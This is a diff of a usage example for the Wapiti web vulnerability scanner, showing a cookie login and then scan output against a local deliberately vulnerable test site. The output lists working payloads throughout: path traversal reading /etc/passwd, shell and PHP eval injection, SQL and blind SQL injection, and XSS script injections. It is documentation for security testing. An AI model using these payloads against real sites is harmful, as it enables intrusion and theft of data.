@@ -1,68 +1,190 @@
-First I use getcookie.py to login in the restricted area and get the cookie in cookies.txt
+First, I use getcookie.py to login in the restricted area and get the cookie in cookies.json :
 
-bash-3.0$ python getcookie.py cookies.txt http://127.0.0.1/vuln/?page=login
-Please enter values for the folling form :
+bash-4.2$ python net/getcookie.py /tmp/cookies.json http://127.0.0.1/vuln/login.php
+<Cookie PHPSESSID=OLPNLIEBPEFELBIFGMKJEKOD for 127.0.0.1/>
+Please enter values for the following form: 
 url = http://127.0.0.1/vuln/login.php
-login (on) : toto
-password (on) : toto
-0 : <Cookie PHPSESSID=8qte5k7jr6ogkocrlcrk9obmj2 for 127.0.0.1/>
+username (default) : admin
+password (letmein) : secret
+<Cookie PHPSESSID=OLPNLIEBPEFELBIFGMKJEKOD for 127.0.0.1/>
 
-Then I scan the vuln website using the cookie and excluding the logout script
+It can also be done with cookie.py this way :
+python net/cookie.py /tmp/cookies.json http://127.0.0.1/vuln/login.php username=admin password=secret
 
-bash-3.0$ python wapiti.py http://127.0.0.1/vuln/ -c cookies.txt -x http://127.0.0.1/vuln/index.php?page=logout
-..........................
+Then, I scan the vulnerable website using the cookie and excluding the logout script :
 
-Attacking urls (GET)...
------------------------
-Warning fread (article) in http://127.0.0.1/vuln/
-	Evil url: http://127.0.0.1/vuln/?article=http%3A%2F%2Fwww.google.fr%2F&page=articles
-Unix include/fread (article) in http://127.0.0.1/vuln/
-	Evil url: http://127.0.0.1/vuln/?article=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&page=articles
-Warning require (page) in http://127.0.0.1/vuln/
-	Evil url: http://127.0.0.1/vuln/?article=plop.txt&page=http%3A%2F%2Fwww.google.fr%2F
-Unix include/fread (page) in http://127.0.0.1/vuln/
-	Evil url: http://127.0.0.1/vuln/?article=plop.txt&page=%2Fetc%2Fpasswd%00
-Unix include/fread (article) in http://127.0.0.1/vuln/
-	Evil url: http://127.0.0.1/vuln/?article=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&page=articles2
-Warning require (page) in http://127.0.0.1/vuln/
-	Evil url: http://127.0.0.1/vuln/?article=truc.txt&page=http%3A%2F%2Fwww.google.fr%2F
-Unix include/fread (page) in http://127.0.0.1/vuln/
-	Evil url: http://127.0.0.1/vuln/?article=truc.txt&page=%2Fetc%2Fpasswd%00
-Warning require (page) in http://127.0.0.1/vuln/
-	Evil url: http://127.0.0.1/vuln/?page=http%3A%2F%2Fwww.google.fr%2F
-Unix include/fread (page) in http://127.0.0.1/vuln/
-	Evil url: http://127.0.0.1/vuln/?page=%2Fetc%2Fpasswd%00
-Warning require (page) in http://127.0.0.1/vuln/
-	Evil url: http://127.0.0.1/vuln/?var=plop&page=http%3A%2F%2Fwww.google.fr%2F
-Unix include/fread (page) in http://127.0.0.1/vuln/
-	Evil url: http://127.0.0.1/vuln/?var=plop&page=%2Fetc%2Fpasswd%00
-XSS (var) in http://127.0.0.1/vuln/
-	Evil url: http://127.0.0.1/vuln/?var=%3Cscript%3Evar+wapiti_687474703a2f2f3132372e302e302e312f7e7369726975732f76756c6e2f_766172%3Dnew+Boolean%28%29%3B%3C%2Fscript%3E&page=xss
-Command execution (var) in http://127.0.0.1/vuln/eval.php
-	Evil url: http://127.0.0.1/vuln/eval.php?var=a%3Benv
-500 HTTP Error code with
-	Evil url: http://127.0.0.1/vuln/test.php?http%3A//www.google.fr/
-500 HTTP Error code with
-	Evil url: http://127.0.0.1/vuln/test.php?a%3Benv
-500 HTTP Error code with
-	Evil url: http://127.0.0.1/vuln/test.php?'"(
-XSS (QUERY_STRING) in http://127.0.0.1/vuln/test.php
-	Evil url: http://127.0.0.1/vuln/test.php?%3Cscript%3Evar%20wapiti_687474703a2f2f3132372e302e302e312f7e7369726975732f76756c6e2f746573742e706870_5155455259535452494e47%3Dnew%20Boolean%28%29%3B%3C/script%3E
-MySQL Injection (user) in http://127.0.0.1/vuln/usermsg.php
-	Evil url: http://127.0.0.1/vuln/usermsg.php?user=%27%22%28
+bash-4.2$ python wapiti.py http://127.0.0.1/vuln/ -c cookies.json -x http://127.0.0.1/vuln/logout.php
 
-Attacking forms (POST)...
--------------------------
-SQL Injection found with http://127.0.0.1/vuln/login.php
-  and params = login=%27%22%28&password=on
-  coming from http://127.0.0.1/vuln/?page=login
-SQL Injection found with http://127.0.0.1/vuln/login.php
-  and params = login=on&password=%27%22%28
-  coming from http://127.0.0.1/vuln/?page=login
+Wapiti-SVN (wapiti.sourceforge.net)
 
-Looking for permanent XSS
--------------------------
+ Note
+========
+This scan has been saved in the file /home/audit/.wapiti/scans/127.0.0.1.xml
+You can use it to perform attacks without scanning again the web site with the "-k" parameter
+[*] Loading modules:
+	 mod_crlf, mod_exec, mod_file, mod_sql, mod_xss, mod_backup, mod_htaccess, mod_blindsql, mod_permanentxss, mod_nikto
 
-Upload scripts found :
-----------------------
-http://127.0.0.1/vuln/upload.php
+[+] Launching module exec
+Command execution in http://127.0.0.1/vuln/exec/system.php via injection in the parameter host
+  Evil url: http://127.0.0.1/vuln/exec/system.php?host=%3Benv
+Command execution in http://127.0.0.1/vuln/exec/passthru.php via injection in the parameter host
+  Evil url: http://127.0.0.1/vuln/exec/passthru.php?host=%3Benv
+Timeout occured in http://127.0.0.1/vuln/exec/shell_exec.php
+  Evil url: http://127.0.0.1/vuln/exec/shell_exec.php?host=a%60sleep%20600%60
+Received a HTTP 500 error in http://127.0.0.1/vuln/exec/eval.php
+  Evil url: http://127.0.0.1/vuln/exec/eval.php?code=%3Benv
+PHP evaluation in http://127.0.0.1/vuln/exec/eval.php via injection in the parameter code
+  Evil url: http://127.0.0.1/vuln/exec/eval.php?code=a%3Bexit%28base64_decode%28%27dzRwMXQxX2V2YWw%3D%27%29%29%3B%2F%2F
+
+[+] Launching module file
+Received a HTTP 500 error in http://127.0.0.1/vuln/exec/eval.php
+  Evil url: http://127.0.0.1/vuln/exec/eval.php?code=%2Fetc%2Fpasswd
+Linux local file disclosure vulnerability in http://127.0.0.1/vuln/include/include_get_simple.php via injection in the parameter f
+  Evil url: http://127.0.0.1/vuln/include/include_get_simple.php?f=%2Fetc%2Fpasswd
+File disclosure vulnerability in include_path in http://127.0.0.1/vuln/include/readfile_get_simple.php via injection in the parameter f
+  Evil url: http://127.0.0.1/vuln/include/readfile_get_simple.php?f=.depdb
+Linux local file disclosure vulnerability in http://127.0.0.1/vuln/include/include_get_post_conditional.php?id=2 via injection in the parameter f
+Evil request:
+POST /vuln/include/include_get_post_conditional.php?id=2 HTTP/1.1
+Host: 127.0.0.1
+Referer: http://127.0.0.1/vuln/include/include_get_post_conditional.php?id=2
+Content-Type: application/x-www-form-urlencoded
+
+f=%2Fetc%2Fpasswd
+
+
+[+] Launching module sql
+Received a HTTP 500 error in http://127.0.0.1/vuln/exec/eval.php
+  Evil url: http://127.0.0.1/vuln/exec/eval.php?code=%BF%27%22%28
+MySQL Injection in http://127.0.0.1/vuln/sql/login.php via injection in the parameter login
+  Evil url: http://127.0.0.1/vuln/sql/login.php?login=%BF%27%22%28&password=test
+MySQL Injection in http://127.0.0.1/vuln/sql/login.php via injection in the parameter password
+  Evil url: http://127.0.0.1/vuln/sql/login.php?login=test&password=%BF%27%22%28
+MySQL Injection in http://127.0.0.1/vuln/sql/login_post.php via injection in the parameter login
+Evil request:
+POST /vuln/sql/login_post.php HTTP/1.1
+Host: 127.0.0.1
+Referer: http://127.0.0.1/vuln/sql/login_post.php
+Content-Type: application/x-www-form-urlencoded
+
+login=%BF%27%22%28&password=letmein
+
+MySQL Injection in http://127.0.0.1/vuln/sql/login_post.php via injection in the parameter password
+Evil request:
+POST /vuln/sql/login_post.php HTTP/1.1
+Host: 127.0.0.1
+Referer: http://127.0.0.1/vuln/sql/login_post.php
+Content-Type: application/x-www-form-urlencoded
+
+login=default&password=%BF%27%22%28
+
+
+[+] Launching module xss
+XSS vulnerability in http://127.0.0.1/vuln/xss/xss_in_get.php via injection in the parameter vuln
+  Evil url: http://127.0.0.1/vuln/xss/xss_in_get.php?firstname=James&vuln=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%27w3xanau7e6%27%29%3C%2Fscript%3E&lastname=Bond
+XSS vulnerability in http://127.0.0.1/vuln/xss/xss_in_get_text_script.php via injection in the parameter vuln
+  Evil url: http://127.0.0.1/vuln/xss/xss_in_get_text_script.php?vuln=String.fromCharCode%280%2Cwv503afd6b%2C1%29
+XSS vulnerability in http://127.0.0.1/vuln/xss/xss_in_get_noscript.php via injection in the parameter vuln
+  Evil url: http://127.0.0.1/vuln/xss/xss_in_get_noscript.php?vuln=%3C%2Ftextarea%3E%3C%2Fp%3E%3C%2Fdiv%3E%3C%2Fnoscript%3E%3Cscript%3Ealert%28%27wfalvx3r3y%27%29%3C%2Fscript%3E
+XSS vulnerability in http://127.0.0.1/vuln/xss/xss_in_get_if_cond.php via injection in the parameter vuln
+  Evil url: http://127.0.0.1/vuln/xss/xss_in_get_if_cond.php?vuln=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%27wjl4df7rtf%27%29%3C%2Fscript%3E&id=2
+XSS vulnerability in http://127.0.0.1/vuln/xss/xss_in_query_string.php via injection in the query string
+  Evil url: http://127.0.0.1/vuln/xss/xss_in_query_string.php?%3Cscript%3Ealert%28%27w1jnjlqhnq%27%29%3C%2Fscript%3E
+XSS vulnerability in http://127.0.0.1/vuln/xss/xss_in_php_self.php via injection in the resource path
+  Evil url: http://127.0.0.1/vuln/xss/xss_in_php_self.php/%3Cscript%3Ephpselfxss()%3C/script%3E
+XSS vulnerability in http://127.0.0.1/vuln/xss/permanent_xss_in_get_direct.php via injection in the parameter vuln
+  Evil url: http://127.0.0.1/vuln/xss/permanent_xss_in_get_direct.php?firstname=James&lastname=Bond&vuln=%3Cscript%3Ealert%28%27wrb6hruotv%27%29%3C%2Fscript%3E
+
+XSS vulnerability in http://127.0.0.1/vuln/xss/xss_in_post.php via injection in the parameter vuln
+Evil request:
+POST /vuln/xss/xss_in_post.php HTTP/1.1
+Host: 127.0.0.1
+Referer: http://127.0.0.1/vuln/xss/xss_in_post.php
+Content-Type: application/x-www-form-urlencoded
+
+firstname=James&lastname=Bond&vuln=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%27w1f181ucnr%27%29%3C%2Fscript%3E
+
+XSS vulnerability in http://127.0.0.1/vuln/xss/permanent_xss_in_post_direct.php via injection in the parameter vuln
+Evil request:
+POST /vuln/xss/permanent_xss_in_post_direct.php HTTP/1.1
+Host: 127.0.0.1
+Referer: http://127.0.0.1/vuln/xss/permanent_xss_in_post_direct.php
+Content-Type: application/x-www-form-urlencoded
+
+firstname=James&lastname=Bond&vuln=%3Cscript%3Ealert%28%27wz00qm40jx%27%29%3C%2Fscript%3E
+
+XSS vulnerability in http://127.0.0.1/vuln/xss/xss_in_post_url.php?style=%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert%28%27wpk5q4ybjo%27%29%3C%2Fscript%3E via injection in the parameter style
+Evil request:
+POST /vuln/xss/xss_in_post_url.php?style=%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert%28%27wpk5q4ybjo%27%29%3C%2Fscript%3E HTTP/1.1
+Host: 127.0.0.1
+Referer: http://127.0.0.1/vuln/xss/xss_in_post_url.php
+Content-Type: application/x-www-form-urlencoded
+
+username=Enter%20your%20username
+
+
+[+] Launching module blindsql
+Received a HTTP 500 error in http://127.0.0.1/vuln/exec/eval.php
+  Evil url: http://127.0.0.1/vuln/exec/eval.php?code=sleep%287%29%231
+Blind SQL vulnerability in http://127.0.0.1/vuln/sql/login_blind.php via injection in the parameter login
+  Evil url: http://127.0.0.1/vuln/sql/login_blind.php?login=%27%20or%20sleep%287%29%231&password=test
+Blind SQL vulnerability in http://127.0.0.1/vuln/sql/login_blind.php via injection in the parameter password
+  Evil url: http://127.0.0.1/vuln/sql/login_blind.php?login=test&password=%27%20or%20sleep%287%29%231
+Blind SQL vulnerability in http://127.0.0.1/vuln/sql/login_post_blind.php via injection in the parameter login
+Evil request:
+POST /vuln/sql/login_post_blind.php HTTP/1.1
+Host: 127.0.0.1
+Referer: http://127.0.0.1/vuln/sql/login_post_blind.php
+Content-Type: application/x-www-form-urlencoded
+
+login=%27%20or%20sleep%287%29%231&password=letmein
+
+Blind SQL vulnerability in http://127.0.0.1/vuln/sql/login_post_blind.php via injection in the parameter password
+Evil request:
+POST /vuln/sql/login_post_blind.php HTTP/1.1
+Host: 127.0.0.1
+Referer: http://127.0.0.1/vuln/sql/login_post_blind.php
+Content-Type: application/x-www-form-urlencoded
+
+login=default&password=%27%20or%20sleep%287%29%231
+
+
+[+] Launching module permanentxss
+Stored XSS vulnerability in http://127.0.0.1/vuln/xss/permanent_xss_in_post.php via injection in the parameter vuln
+Evil request:
+POST /vuln/xss/permanent_xss_in_post.php HTTP/1.1
+Host: 127.0.0.1
+Referer: http://127.0.0.1/vuln/xss/permanent_xss_in_post.php
+Content-Type: application/x-www-form-urlencoded
+
+firstname=James&lastname=Bond&vuln=%3Cscript%3Ealert%28%27w1rc0mzxmd%27%29%3C%2Fscript%3E
+
+Stored XSS vulnerability in http://127.0.0.1/vuln/xss/permanent_xss_in_post_direct.php via injection in the parameter vuln
+Evil request:
+POST /vuln/xss/permanent_xss_in_post_direct.php HTTP/1.1
+Host: 127.0.0.1
+Referer: http://127.0.0.1/vuln/xss/permanent_xss_in_post_direct.php
+Content-Type: application/x-www-form-urlencoded
+
+firstname=James&lastname=Bond&vuln=%3Cscript%3Ealert%28%27wz00qm40jx%27%29%3C%2Fscript%3E
+
+Stored XSS vulnerability in http://127.0.0.1/vuln/xss/permanent_xss_in_get.php via injection in the parameter vuln
+  Evil url: http://127.0.0.1/vuln/xss/permanent_xss_in_get.php?firstname=James&lastname=Bond&vuln=%3Cscript%3Ealert%28%27we37lsoicn%27%29%3C%2Fscript%3E
+Stored XSS vulnerability in http://127.0.0.1/vuln/xss/permanent_xss_in_get_direct.php via injection in the parameter vuln
+  Evil url: http://127.0.0.1/vuln/xss/permanent_xss_in_get_direct.php?firstname=James&lastname=Bond&vuln=wrb6hruotv
+Stored XSS vulnerability in http://127.0.0.1/vuln/xss/permanent_xss_in_get_direct.php via injection in the parameter vuln
+  Evil url: http://127.0.0.1/vuln/xss/permanent_xss_in_get_direct.php?firstname=James&lastname=Bond&vuln=wrb6hruotv
+Stored XSS vulnerability in http://127.0.0.1/vuln/xss/permanent_xss_in_post_result_elsewhere_submit.php via injection in the parameter vuln
+Evil request:
+POST /vuln/xss/permanent_xss_in_post_result_elsewhere_submit.php HTTP/1.1
+Host: 127.0.0.1
+Referer: http://127.0.0.1/vuln/xss/permanent_xss_in_post_result_elsewhere.php
+Content-Type: application/x-www-form-urlencoded
+
+firstname=James&lastname=Bond&vuln=%3Cscript%3Ealert%28%27wewjm7d17s%27%29%3C%2Fscript%3E
+
+
+Report
+------
+A report has been generated in the file /home/audit/.wapiti/generated_report
+Open /home/audit/.wapiti/generated_report/index.html with a browser to see this report.
